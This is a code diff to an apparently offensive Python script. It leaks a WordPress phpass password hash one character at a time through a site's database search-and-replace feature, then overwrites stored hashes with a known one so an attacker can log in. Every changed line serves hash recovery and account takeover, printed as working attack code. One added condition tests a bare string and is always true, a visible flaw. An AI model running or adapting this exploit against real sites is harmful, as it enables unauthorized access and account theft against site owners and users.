@@ -55,7 +55,7 @@ class Target(object):
 		sys.stdout.flush()
 		original_hash = "$P$B"
 		for x in self.ALPHABET:
-			html = self.replace("$P$B"+x,'$P$B$')
+			html = self.replace("$P$B"+x,'$P$B$$')
 			if "<strong>0</strong> cells were changed" not in html:
 				original_hash = original_hash+x
 				break
@@ -65,16 +65,22 @@ class Target(object):
 			sys.stdout.write("-")
 			sys.stdout.flush()
 			for x in self.ALPHABET:
-				html = self.replace("$P$B$"+x,'$P$B$')
+				html = self.replace("$P$B$$"+x,'$P$B$$')
 				if "<strong>0</strong> cells were changed" not in html:
-					original_hash = original_hash+x
-					break
+					if "<strong>1</strong> cells were changed":
+						original_hash = original_hash+x
+						break
+					else:
+						Target.bad("We just had a collision. Sorry bout'it. Fixing this will be hard")
+						original_hash = original_hash+x
+						Target.info("Let's continue anyway")
+						break
 		sys.stdout.write("\n")
 		if len(original_hash) == 34:
 			Target.good("We did it Reddit! Original hash was "+original_hash)
 			
-		self.replace("$P$B$",self.PASSWORD_HASH)
-		Target.good("You can login with any user and password "+self.password)
+		self.replace("$P$B$$",self.PASSWORD_HASH)
+		Target.good("We don't know which user we changed, but the password is "+self.password)
 
 	def populate(self):
 		Target.good("Getting info at "+self.url)
